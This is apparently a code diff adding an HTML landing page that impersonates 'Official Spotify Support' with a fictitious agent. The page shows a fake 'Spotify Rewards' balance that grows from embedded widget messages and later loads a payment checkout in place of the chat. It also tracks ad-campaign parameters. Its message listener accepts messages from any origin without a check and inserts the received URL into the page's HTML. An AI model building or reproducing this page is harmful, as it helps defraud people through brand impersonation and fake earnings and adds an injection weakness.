SNSYnIIPlyRCRD7jOefT6VzZnZOMILRHqYDGxq4yrTvrFL73d/lY65NHs2fUbyLDNc332cj2SP+hIP4V+JX7VfijwTqXjWRvEum6neK5eJWt7pIotsfy8K0D45HrzX7K+CbxvtCaW2WkDTT/Mf43ZuTX40/GHUNd0TxJceHLH4iPZH7RK8yu14uxZDwPkjYfLg9PWuHB2k+cw4vk4YZU+jfl+pzXwP+G2h/FP4o+Evh5oGk3Frpcxmu7xri685vIRl3HiOPAIXb0OSe1f0qaPpqR26W8KhIo1CKo7KowAPoK/Nr9jvTfDfhDwdJ8UPHXiWLWpp4haQ6lK7sFt4nZhEnmKshO9iSoHJAr7C+Gvxwj+I3xIk8K6HbeTpkVrJMssvEsroVAO3oq4J45J746V7dOrTppRm/el0Ofh3K5ww0q6j8Wrfl0/z+Z9FRaPbv8wZvzqf+xYP7zfnWpDFIABU3kz1skj1rH//W+s9XkP2/nsf5V7H4MugulRqTycn9a8X1n/kIN+Ner+EP+PKH/davm8b8PzPpsvS536GV8VZj/ZEqJxkcVU8L+JrXQ9V054zn7HZW8CD3lAZm/LP51J8Uv+Qa3+6K82tP+QnB/wBcbX/0Ba8pyakehiYrkXz/AEMua/vfFnxUl1LUnLC5aWV2PZEYKFH4gVwf7RXjZow+k6beWdlcQx+XbNeSKkccjfx/MCMggkHH8Fdl4f8A+R0P/XCf/wBGivjP9sj/AJC7f76/+16rArmep4+d1HDDycdNDyPR9Q8faPKUi8WeGbCFh8skKW5lCjvujt2Yt6nNekfDX426x+z5rFz4k8G65D4ikv2Y3lsIpI7eVjyHaSQId4JOCFHpkg4r4XTpB/1z/wAK761/5BEv+6P6V7qbTVj8NrYqpTqqcJPmXW7PovWPiLrHxQ8US/FLXvFcGla7MskX2S6gcQeQSMKHCyowIAyrqMY79a+9PgP46nvYNH1DxHf6ZOZ4G0q4ezkjA86PJtyAoXhoyw2gDHPGK/HfVP8AVx/7rf8AoVfZv7Nv/IA0j/sYbX/0U9ZVXeLue9wviajxd29999fM/RXTBLp9/c3MPM8LyxMo7ZPyn9fwr8yfj94Y8Q614sW48MeGtN1iC5VZpTIMTEnO4fLMjE7snOO/tX6eQf8AIa1j/r4P/oQr4/H/ACOFp/1yP/oTVxYNWqcq2PvOJqSq4R83Ro+WPhpdST6zf2D2a6dFYTG3FmjM0du0YAcLvZyPmBJ+Y8mvu79n7WZNN+LelCBtv2oSW2f99SR+oFfD/gv/AJH7xh/2F7z/ANDNfXvwS/5Kz4e/6+0/ka47tYpPz/U+1wlGKyyMFsof+2n6vibWlPySZ/Cnfadc/vj8qvp1qWvrT4+x/9k=" alt="Kaytlynn W.">
+          <div class="chat-agent-info">
+            <span class="chat-agent-name">Kaytlynn W.</span>
+            <span class="chat-agent-status">Official Spotify Support</span>
+          </div>
+        </div>
+
+        <!-- Typebot embedded inside centralized container -->
+        <iframe id="typebot-iframe" data-src="/chat.html"
+          allow="autoplay; fullscreen; encrypted-media; picture-in-picture; geolocation; microphone; camera" allowfullscreen></iframe>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Passa os parâmetros de campanha ao Typebot uma única vez.
+    // O UTMify continua ativo para links e pixel, mas ignora iframes para não recarregar a conversa.
+    (function setTypebotCampaignParameters() {
+      var typebotFrame = document.getElementById('typebot-iframe');
+      if (!typebotFrame) return;
+
+      var sourceSearch = window.location.search;
+      try {
+        if (window.parent !== window && window.parent.location.origin === window.location.origin) {
+          sourceSearch = window.parent.location.search || sourceSearch;
+        }
+      } catch (error) {
+        // Mantém os parâmetros da página atual quando o acesso à janela pai não for permitido.
+      }
+
+      var sourceParams = new URLSearchParams(sourceSearch);
+      var campaignParams = new URLSearchParams();
+      var campaignKeys = ['src', 'sck', 'fbclid', 'gclid', 'ttclid', 'msclkid'];
+
+      sourceParams.forEach(function (value, key) {
+        if (/^utm_/i.test(key) || campaignKeys.indexOf(key.toLowerCase()) !== -1) {
+          campaignParams.append(key, value);
+        }
+      });
+
+      var typebotUrl = new URL(typebotFrame.getAttribute('data-src'), window.location.href);
+      campaignParams.forEach(function (value, key) {
+        typebotUrl.searchParams.set(key, value);
+      });
+      typebotFrame.setAttribute('src', typebotUrl.toString());
+    })();
+
+    // Extract balance parameter from URL (padrão 0.00 se for iniciar com o fluxo de música dentro do chat)
+    var urlParams = new URLSearchParams(window.location.search);
+    var currentBalance = parseFloat(urlParams.get('balance') || '0.00');
+
+    function updateHeaderBalance(val) {
+      currentBalance = parseFloat(val);
+      var headerEl = document.getElementById('headerBalance');
+      if (headerEl) {
+        headerEl.textContent = currentBalance.toFixed(2);
+      }
+    }
+
+    updateHeaderBalance(currentBalance);
+
+    // ESCUTA MENSAGENS DO TYPEBOT OU WIDGET EMBEDADO
+    var lastBalanceAddition = null;
+    window.addEventListener('message', function (event) {
+      if (!event.data) return;
+
+      // Atualiza saldo vindo de um widget de música embedado no Typebot
+      if (event.data.type === 'sp-update-balance') {
+        updateHeaderBalance(event.data.balance);
+      } else if (event.data.type === 'sp-add-balance') {
+        var reward = parseFloat(event.data.reward);
+        if (!isFinite(reward)) return;
+        // O widget envia para parent e top; na Lovable, a mensagem pode chegar duas vezes.
+        if (lastBalanceAddition && lastBalanceAddition.reward === reward && Date.now() - lastBalanceAddition.time < 1000) return;
+        lastBalanceAddition = { reward: reward, time: Date.now() };
+        currentBalance += reward;
+        updateHeaderBalance(currentBalance);
+      }
+
+      // ESCUTA O LAUNCHER DO WORKER PARA TRANSFORMAR O CARD NO CHECKOUT COMPLETO
+      if (event.data.type === 'kash-show-checkout') {
+        var checkoutUrl = event.data.url;
+        var chatCard = document.querySelector('.chat-card');
+        if (chatCard) {
+          chatCard.innerHTML = '<iframe id="checkout-iframe" src="' + checkoutUrl + '" style="width: 100%; height: 100%; border: none; border-radius: 14px; background: #ffffff;" allow="geolocation; microphone; camera; payment"></iframe>';
+        }
+      }
+    });
+  
+    // PRELOADER ANIMATION
+    (function runPreloader() {
+      var bar = document.getElementById('preloaderBar');
+      var status = document.getElementById('preloaderStatus');
+      var preloader = document.getElementById('spotifyPreloader');
+      if (!bar || !status || !preloader) return;
+
+      var steps = [
+        { time: 150, pct: '30%', text: 'Connecting to Spotify Rewards...' },
+        { time: 850, pct: '65%', text: 'Connecting to support representative...' },
+        { time: 1600, pct: '100%', text: 'Connecting live chat...' }
+      ];
+
+      steps.forEach(function(step) {
+        setTimeout(function() {
+          bar.style.width = step.pct;
+          status.textContent = step.text;
+        }, step.time);
+      });
+
+      setTimeout(function() {
+        preloader.classList.add('hidden');
+      }, 2100);
+    })();
+
+  </script>
+
+</body>
+
+</html>
